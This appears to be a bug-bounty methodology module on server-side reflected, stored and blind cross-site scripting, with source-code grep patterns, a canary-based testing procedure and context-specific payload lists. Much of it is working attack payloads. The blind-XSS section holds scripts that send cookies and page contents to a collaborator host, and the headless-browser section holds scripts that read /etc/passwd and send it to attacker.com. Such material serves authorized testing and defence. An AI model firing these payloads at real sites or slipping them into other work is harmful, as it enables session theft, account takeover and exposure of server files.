# VULN MODULE — Reflected & Stored XSS (Server-Side)
# Asset: webapp
# CWE-79 | Report prefix: WEB-XSS
# See also: dom_xss.md (DOM/client-side variant), xss_filter_evasion.md (payload bypass)

## THREAT MODEL

Reflected XSS: server echoes user-supplied input back in the HTTP response without
sanitization. Payload fires in the victim's browser when they click an attacker-crafted URL.

Stored XSS: payload is persisted in the database and fires for every user who views
the content (admin panel, feed, profile, etc.). Higher impact — no victim URL required.

Blind XSS: payload is stored and fires in a context you cannot directly observe —
headless browsers, admin dashboards, PDF generators, email clients, log viewers.
Can reach server-local files or internal services if the headless browser has permissions.

Key distinction from DOM XSS: the payload IS visible in the HTTP response body.
Server-side scanners and proxy tools CAN detect it.

---

## WHITEBOX GREP PATTERNS

```bash
# PHP — unsafe output
grep -rn "echo \$_GET\|echo \$_POST\|echo \$_REQUEST\|echo \$_COOKIE" --include="*.php"
grep -rn "print \$_\|<?=\s*\$_" --include="*.php"
grep -rn "echo \$[a-z_]*;\s*$" --include="*.php"  # variables fed from request
# Verify: htmlspecialchars / htmlentities / esc_html / esc_attr used?

# Node.js / Express — template rendering with user data
grep -rn "res\.send(\|res\.write(\|res\.end(" --include="*.js" --include="*.ts" | \
  grep -v "res\.send({\|res\.send(\[" # filter out JSON-only sends
grep -rn "render.*req\.\|render.*params\.\|render.*query\." --include="*.js" --include="*.ts"

# Python / Django / Flask
grep -rn "mark_safe(\|format_html(\|Markup(\|jinja2.*Markup" --include="*.py"
grep -rn "render_template.*request\.\|{{ .*request\." --include="*.html" --include="*.j2"
# mark_safe() / Markup() bypass auto-escaping — always flag

# Java / Spring
grep -rn "response\.getWriter\(\)\.print\|out\.print\|out\.write" --include="*.java"
grep -rn "model\.addAttribute.*request\.\|model\.put.*request\." --include="*.java"

# Generic — dangerous output patterns
grep -rn "innerHTML\s*=\|document\.write(\|\.html(" --include="*.js" --include="*.ts"
# (source tracing for these → dom_xss.md)
```

---

## TESTING METHODOLOGY — 3-STEP PROCESS

### Step 1 — Reflection mapping (canary string)

Inject a unique, inert string into every input surface and map where it appears in responses.

```bash
CANARY="xsstest1337abc"

# Test all query parameters
curl -s "https://target.com/search?q=$CANARY" | grep -o "$CANARY"
curl -s "https://target.com/page?lang=$CANARY" | grep -o "$CANARY"

# Test body parameters
curl -s -X POST "https://target.com/submit" \
  -d "name=$CANARY&email=test@test.com" | grep -o "$CANARY"

# Test HTTP headers that are often reflected
curl -s "https://target.com/" \
  -H "User-Agent: $CANARY" \
  -H "Referer: https://$CANARY.attacker.com" \
  -H "X-Forwarded-For: $CANARY" | grep -o "$CANARY"

# Test path segments
curl -s "https://target.com/$CANARY" | grep -o "$CANARY"
```

**For each reflection found — determine encoding:**
- Unencoded `<>"'` → potentially exploitable
- HTML-encoded (`&lt;`, `&gt;`) → typically not exploitable (but check JS context)
- URL-encoded only → check if decoded before HTML output

### Step 2 — Context identification

For each reflection point, identify the HTML context it lands in:

```
Context type → Indicator in source → Escape technique
─────────────────────────────────────────────────────
HTML body      → <div>REFLECTED</div>          → inject tags directly
HTML attribute → value="REFLECTED"              → close quote, inject handler
JS string DQ   → var x = "REFLECTED";          → "; payload //
JS string SQ   → var x = 'REFLECTED';          → '; payload //
JS template    → var x = `REFLECTED`;          → ${payload}
URL param      → href="?q=REFLECTED"           → javascript: or break to attr
Textarea       → <textarea>REFLECTED</textarea> → </textarea><payload>
Title tag      → <title>REFLECTED</title>       → </title><payload>
Style context  → <style>REFLECTED</style>       → expression() or </style><payload>
JSON value     → {"key":"REFLECTED"}            → ","key":"<payload>
```

### Step 3 — Context-specific payload crafting

See §PAYLOADS BY CONTEXT below.

---

## PAYLOADS BY CONTEXT

### HTML body — inject tags directly
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<!-- If script/img/svg blocked, try: -->
<details open ontoggle=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<xss onfocus=alert(document.domain) autofocus tabindex=1>
```

### HTML attribute — break out of attribute value
```html
<!-- Double-quoted attribute: value="INJECT" -->
" onmouseover="alert(document.domain)
"><img src=x onerror=alert(document.domain)>
"><svg onload=alert(document.domain)>

<!-- Single-quoted attribute: value='INJECT' -->
' onmouseover='alert(document.domain)
'><img src=x onerror=alert(document.domain)>

<!-- Unquoted attribute: value=INJECT -->
x onmouseover=alert(document.domain)
x/onclick=alert(document.domain)

<!-- href/src attribute (URL context): href="INJECT" -->
javascript:alert(document.domain)
```

### JavaScript string context — break out of string
```javascript
// Double-quoted: var x = "INJECT";
"; alert(document.domain)//
"-alert(document.domain)-"
\"; alert(document.domain)//     // if backslash is doubled → try \\

// Single-quoted: var x = 'INJECT';
'; alert(document.domain)//
'-alert(document.domain)-'

// Template literal: var x = `INJECT`;
${alert(document.domain)}
`; alert(document.domain)//

// Inside function call: foo("INJECT")
");alert(document.domain)//
",alert(document.domain),"
```

### Textarea / title / style — escape the tag first
```html
<!-- <textarea>INJECT</textarea> -->
</textarea><img src=x onerror=alert(document.domain)>

<!-- <title>INJECT</title> -->
</title><img src=x onerror=alert(document.domain)>

<!-- <style>INJECT</style> -->
</style><img src=x onerror=alert(document.domain)>
<!-- Alternative in IE/old browsers: -->
</style><script>alert(document.domain)</script>
```

### JSON response (reflected in API response parsed by JS)
```json
// If API returns: {"name":"INJECT"} and JS uses it in innerHTML:
// Payload in the parameter:
{"name":"<img src=x onerror=alert(1)>"}
// Or break JSON if app parses and re-renders:
","admin":true,"x":"
```

---

## BLIND / SERVER-SIDE XSS

Payload fires in a context you cannot observe directly:
admin log viewers, internal dashboards, PDF generators, email HTML bodies,
headless browser screenshot tools, customer support panels.

### Detection — use OOB callback payloads
```html
<!-- XSS Hunter / Burp Collaborator payload -->
<script src="https://YOUR-COLLABORATOR.com/probe.js"></script>
<img src=x onerror="fetch('https://YOUR-COLLABORATOR.com/?c='+btoa(document.cookie))">
<script>
  fetch('https://YOUR-COLLABORATOR.com/blind', {
    method: 'POST',
    body: JSON.stringify({
      url: location.href,
      cookie: document.cookie,
      dom: document.documentElement.outerHTML.substring(0, 2000)
    })
  })
</script>
```

### Tools for blind XSS
| Tool | Purpose |
|------|---------|
| **XSS Hunter** (xsshunter.com / self-host) | Hosts callback JS, logs URL, cookies, DOM, screenshot when payload fires |
| **Burp Collaborator** | OOB DNS/HTTP callback — confirms execution without full data exfiltration |
| **ezXSS** (self-hosted) | Full blind XSS framework with screenshot, cookies, localStorage dump |

### High-value blind XSS injection points
```bash
# These fields often reach admin/internal processing:
User-Agent header        → admin log viewer
Referer header           → analytics dashboard
X-Forwarded-For          → server log viewer
Name / bio / profile     → admin user management panel
Support ticket body      → agent dashboard
Product review           → moderation queue
Error message parameter  → error tracking system (Sentry, etc.)
PDF generation input     → headless Chrome / wkhtmltopdf
Email template field     → HTML email body
Webhook URL / payload    → internal webhook processor
```

### Headless browser file read (if PDF/screenshot generator)
```html
<!-- wkhtmltopdf / headless Chrome may allow local file access -->
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'file:///etc/passwd', false);
  xhr.send();
  fetch('https://attacker.com/exfil?d=' + btoa(xhr.responseText));
</script>

<!-- iframe-based file read -->
<iframe src="file:///etc/passwd" onload="
  fetch('https://attacker.com/?d='+btoa(this.contentDocument.body.innerText))
"></iframe>
```

---

## SELF-XSS ESCALATION

Self-XSS alone is out of scope for bug bounties. Escalate via:

```
1. CSRF → force victim to submit the XSS payload on their own account
   (only works if CSRF protection is missing on the injection endpoint)

2. URL sharing → trick victim into navigating to a URL that auto-fills
   the XSS payload into a field via query parameter

3. Clickjacking → overlay attacker page over the injection form,
   victim "clicks" on attacker UI which submits XSS payload to their account

4. OAuth/login CSRF → attacker logs victim into attacker's account
   (which contains stored XSS) via forged OAuth callback
```

---

## SCOPE — What is and isn't reportable

| Scenario | Verdict |
|----------|---------|
| Reflected XSS in URL param → fires in victim's browser | ✅ High — needs PoC URL |
| Stored XSS visible to other users or admins | ✅ High/Critical |
| Blind XSS with confirmed callback (cookies/DOM exfiltrated) | ✅ High/Critical |
| Self-XSS with no escalation path | ❌ Informative — most programs |
| Self-XSS escalated via CSRF/clickjacking to affect others | ✅ Medium (combined) |
| XSS requiring MitM / browser extension | ❌ Out of scope typically |
| XSS behind login only visible to the same user | ❌ Self-XSS — out of scope |

---

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- `echo $_GET` / `res.send(req.query` / `mark_safe(` found in source → reflected sink
- `innerHTML` / `document.write` reading from DB/API → stored XSS candidate
- User-controlled data flows into email body, PDF template, or admin log → blind XSS
- Canary string found unencoded in HTTP response body during blackbox recon
